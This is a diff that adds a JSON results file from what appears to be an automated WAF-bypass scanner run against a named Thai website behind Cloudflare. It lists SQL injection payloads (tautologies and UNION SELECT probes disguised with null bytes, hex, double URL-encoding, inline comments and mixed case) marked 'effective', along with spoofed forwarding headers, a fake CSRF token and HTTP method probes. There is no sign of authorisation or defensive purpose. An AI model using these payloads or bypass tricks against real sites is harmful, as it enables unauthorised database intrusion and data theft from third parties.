@@ -1,0 +1,526 @@
+{
+  "target": "https://siamdl.co.th",
+  "timestamp": "2025-10-26 17:10:22",
+  "results": {
+    "/?id=1": {
+      "waf_type": "Cloudflare",
+      "effective_payloads": [
+        {
+          "payload": "%00' OR %00'1%00'=%00'1",
+          "status_code": 200,
+          "technique": "URL编码, 空字节"
+        },
+        {
+          "payload": "0x27204f52202731273d2731",
+          "status_code": 200,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "'%09OR%09'1'='1",
+          "status_code": 200,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "%2527%2520OR%2520%25271%2527%253D%25271",
+          "status_code": 200,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "' Or '1'='1",
+          "status_code": 200,
+          "technique": "大小写混合"
+        },
+        {
+          "payload": "'/**/OR/**/'1'='1",
+          "status_code": 200,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "%27%20OR%20%271%27%3D%271",
+          "status_code": 200,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "'%0AOR%0A'1'='1",
+          "status_code": 200,
+          "technique": "URL编码, 换行符"
+        },
+        {
+          "payload": "%u0027 OR %u00271%u0027=%u00271",
+          "status_code": 200,
+          "technique": "URL编码, 大小写混合"
+        },
+        {
+          "payload": "'/*!*/OR/*!*/'1'='1",
+          "status_code": 200,
+          "technique": "未知技术"
+        },
+        {
+          "payload": "' UNION SEL/**/ECT NULL--",
+          "status_code": 200,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "0x2720554e494f4e2053454c454354204e554c4c2d2d",
+          "status_code": 200,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "' UNI/**/ON SELECT NULL--",
+          "status_code": 200,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "' UNION SEL/**/ECT 1,2,3--",
+          "status_code": 200,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "0x2720554e494f4e2053454c45435420312c322c332d2d",
+          "status_code": 200,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "' UNI/**/ON SELECT 1,2,3--",
+          "status_code": 200,
+          "technique": "注释分割"
+        }
+      ],
+      "effective_headers": [
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 200
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 200
+        }
+      ],
+      "effective_methods": [
+        {
+          "method": "POST",
+          "status_code": 405
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 405
+        },
+        {
+          "method": "HEAD",
+          "status_code": 200
+        },
+        {
+          "method": "POST",
+          "status_code": 405
+        },
+        {
+          "method": "PUT",
+          "status_code": 405
+        },
+        {
+          "method": "PATCH",
+          "status_code": 405
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 405
+        },
+        {
+          "method": "HEAD",
+          "status_code": 200
+        },
+        {
+          "method": "POST",
+          "status_code": 405
+        },
+        {
+          "method": "PUT",
+          "status_code": 405
+        },
+        {
+          "method": "PATCH",
+          "status_code": 405
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 405
+        },
+        {
+          "method": "HEAD",
+          "status_code": 200
+        }
+      ]
+    },
+    "/search?q=test": {
+      "waf_type": "Cloudflare",
+      "effective_payloads": [
+        {
+          "payload": "%00' OR %00'1%00'=%00'1",
+          "status_code": 404,
+          "technique": "URL编码, 空字节"
+        },
+        {
+          "payload": "0x27204f52202731273d2731",
+          "status_code": 404,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "'%09OR%09'1'='1",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "%2527%2520OR%2520%25271%2527%253D%25271",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "'/**/OR/**/'1'='1",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "%27%20OR%20%271%27%3D%271",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "'%0AOR%0A'1'='1",
+          "status_code": 404,
+          "technique": "URL编码, 换行符"
+        },
+        {
+          "payload": "%u0027 OR %u00271%u0027=%u00271",
+          "status_code": 404,
+          "technique": "URL编码, 大小写混合"
+        },
+        {
+          "payload": "'/*!*/OR/*!*/'1'='1",
+          "status_code": 404,
+          "technique": "未知技术"
+        },
+        {
+          "payload": "' oR '1'='1",
+          "status_code": 404,
+          "technique": "大小写混合"
+        },
+        {
+          "payload": "'%0AUNION%0ASELECT%0ANULL--",
+          "status_code": 404,
+          "technique": "URL编码, 换行符"
+        },
+        {
+          "payload": "'%09UNION%09SELECT%09NULL--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "' UNION SEL/**/ECT NULL--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "' UnioN SELeCt NUlL--",
+          "status_code": 404,
+          "technique": "大小写混合"
+        },
+        {
+          "payload": "'/**/UNION/**/SELECT/**/NULL--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "0x2720554e494f4e2053454c454354204e554c4c2d2d",
+          "status_code": 404,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "'/*!*/UNION/*!*/SELECT/*!*/NULL--",
+          "status_code": 404,
+          "technique": "未知技术"
+        },
+        {
+          "payload": "%2527%2520UNION%2520SELECT%2520NULL--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "%00' UNION SELECT NULL--",
+          "status_code": 404,
+          "technique": "空字节"
+        },
+        {
+          "payload": "' UNI/**/ON SELECT NULL--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "%u0027 UNION SELECT NULL--",
+          "status_code": 404,
+          "technique": "URL编码, 大小写混合"
+        },
+        {
+          "payload": "%27%20UNION%20SELECT%20NULL--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "' UNION SEL/**/ECT 1,2,3--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "0x2720554e494f4e2053454c45435420312c322c332d2d",
+          "status_code": 404,
+          "technique": "十六进制编码"
+        },
+        {
+          "payload": "' UNion SElECT 1,2,3--",
+          "status_code": 404,
+          "technique": "大小写混合"
+        },
+        {
+          "payload": "'%09UNION%09SELECT%091,2,3--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "%u0027 UNION SELECT 1,2,3--",
+          "status_code": 404,
+          "technique": "URL编码, 大小写混合"
+        },
+        {
+          "payload": "%2527%2520UNION%2520SELECT%25201%252C2%252C3--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "' UNI/**/ON SELECT 1,2,3--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "'/**/UNION/**/SELECT/**/1,2,3--",
+          "status_code": 404,
+          "technique": "注释分割"
+        },
+        {
+          "payload": "'/*!*/UNION/*!*/SELECT/*!*/1,2,3--",
+          "status_code": 404,
+          "technique": "未知技术"
+        },
+        {
+          "payload": "%27%20UNION%20SELECT%201%2C2%2C3--",
+          "status_code": 404,
+          "technique": "URL编码"
+        },
+        {
+          "payload": "%00' UNION SELECT 1,2,3--",
+          "status_code": 404,
+          "technique": "空字节"
+        },
+        {
+          "payload": "'%0AUNION%0ASELECT%0A1,2,3--",
+          "status_code": 404,
+          "technique": "URL编码, 换行符"
+        }
+      ],
+      "effective_headers": [
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Forwarded-Host": "localhost",
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-Port": "443"
+          },
+          "status_code": 404
+        },
+        {
+          "headers": {
+            "X-Requested-With": "XMLHttpRequest",
+            "X-CSRF-Token": "bypass",
+            "Referer": "https://siamdl.co.th"
+          },
+          "status_code": 404
+        }
+      ],
+      "effective_methods": [
+        {
+          "method": "POST",
+          "status_code": 404
+        },
+        {
+          "method": "PATCH",
+          "status_code": 404
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 404
+        },
+        {
+          "method": "HEAD",
+          "status_code": 404
+        },
+        {
+          "method": "POST",
+          "status_code": 404
+        },
+        {
+          "method": "PUT",
+          "status_code": 404
+        },
+        {
+          "method": "PATCH",
+          "status_code": 404
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 404
+        },
+        {
+          "method": "HEAD",
+          "status_code": 404
+        },
+        {
+          "method": "POST",
+          "status_code": 404
+        },
+        {
+          "method": "PUT",
+          "status_code": 404
+        },
+        {
+          "method": "PATCH",
+          "status_code": 404
+        },
+        {
+          "method": "OPTIONS",
+          "status_code": 404
+        },
+        {
+          "method": "HEAD",
+          "status_code": 404
+        }
+      ]
+    }
+  }
+}
